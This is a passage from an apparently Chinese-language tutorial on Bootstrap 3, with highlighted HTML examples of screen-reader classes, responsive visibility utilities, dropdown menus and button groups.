class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>屏幕阅读器和键盘导航  <code>.sr-only</code> 来把元素对所有设备隐藏，除了屏幕阅读器    <code>.sr-only-focusable</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span> <span class="attr">style</span>=<span class="string">"padding: 91px 100px 19px 50px;"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-inline"</span> <span class="attr">role</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span>Email 地址<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Enter email"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">for</span>=<span class="string">"pass"</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sr-only sr-only-focusable"</span> <span class="attr">href</span>=<span class="string">"#content"</span>&gt;</span>Skip to main content<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>响应式工具</strong></p>
<ul>
<li><code>visible-xs</code> <code>visible-sm</code>  <code>visible-md</code>  <code>visible-lg</code></li>
<li><code>hidden-xs</code>   <code>hidden-sm</code>   <code>hidden-md</code>   <code>hidden-lg</code></li>
<li>以超小屏幕（<code>xs</code>）为例，可用的 <code>.visible-*-*</code> 类是：<code>visible-xs-block</code>、<code>visible-xs-inline</code> 和 <code>visible-xs-inline-block</code></li>
<li><code>visible-print-block</code>    <code>visible-print-inline</code>    <code>visible-print-inline-block</code>  浏览器隐藏   打印机可见<br />
<code>hidden-print</code>  浏览器可见   打印机隐藏 <code>visible-print</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"padding: 40px;"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-6 col-sm-3"</span> <span class="attr">style</span>=<span class="string">"background-color: #dedef8;border:1px solid #000;"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hidden-xs"</span>&gt;</span>特别小型<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"visible-xs"</span>&gt;</span>✔ 在特别小型设备上可见<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-6 col-sm-3"</span> <span class="attr">style</span>=<span class="string">"background-color: #dedef8;border:1px solid #000;"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hidden-sm"</span>&gt;</span>小型<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"visible-sm"</span>&gt;</span>✔ 在小型设备上可见<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-6 col-sm-3"</span> <span class="attr">style</span>=<span class="string">"background-color: #dedef8;border:1px solid #000;"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hidden-md"</span>&gt;</span>中型<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"visible-md"</span>&gt;</span>✔ 在中型设备上可见<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-6 col-sm-3"</span> <span class="attr">style</span>=<span class="string">"background-color: #dedef8;border:1px solid #000;"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hidden-lg"</span>&gt;</span>大型<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"visible-lg"</span>&gt;</span>✔ 在大型设备上可见<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>字体图标</strong></p>
<ul>
<li>用法：<code>&lt;span class=&quot;glyphicon glyphicon-search&quot;&gt;&lt;/span&gt;</code></li>
</ul>
</li>
<li>
<p>下拉菜单</p>
<ul>
<li>基本的下拉菜单</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Dropdown <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Html<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>Javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>html5+css3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对齐 <code>dropdown-menu-right</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown-header"</span>&gt;</span>Dropdown header<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>分隔线</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"divider"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>禁用的菜单项</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">aria-labelledby</span>=<span class="string">"dropdownMenu4"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Regular link<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"disabled"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Disabled link<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Another link<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>让菜单默认显示 <code>&lt;div class=&quot;dropdown open&quot;&gt;</code></li>
</ul>
<h4 id="六-按钮-输入框组件"><a class="markdownIt-Anchor" href="#六-按钮-输入框组件"></a> 六、按钮、输入框组件</h4>
<hr />
<h4 id="按钮组件"><a class="markdownIt-Anchor" href="#按钮组件"></a> 按钮组件</h4>
<hr />
<ul>
<li><strong>基本的按钮组</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>按钮工具栏</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-toolbar"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>更多<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>按钮的大小</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group btn-group-lg"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group btn-group-sm"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group btn-group-xs"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>嵌套</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>按钮 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>垂直的按钮组</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group-vertical"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>按钮 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>两端对齐排列的按钮组</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group btn-group-justified"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group btn-group-justified"</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;div class="btn-group"&gt;--&gt;</span>    为了浏览器兼容问题使用btn-group包裹</span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;/div&gt;--&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;div class="btn-group"&gt;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;/div&gt;--&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;div class="btn-group"&gt;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;/div&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>按钮式下拉菜单</strong></p>
</li>
<li>
<p>单按钮下拉菜单   <code>btn-default</code>  <code>btn-success</code>  <code>btn-primary</code>   <code>btn-info</code>   <code>btn-danger</code>   <code>btn-warning</code></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span>Default <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>html<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>分裂式按钮下拉菜单</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>html<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
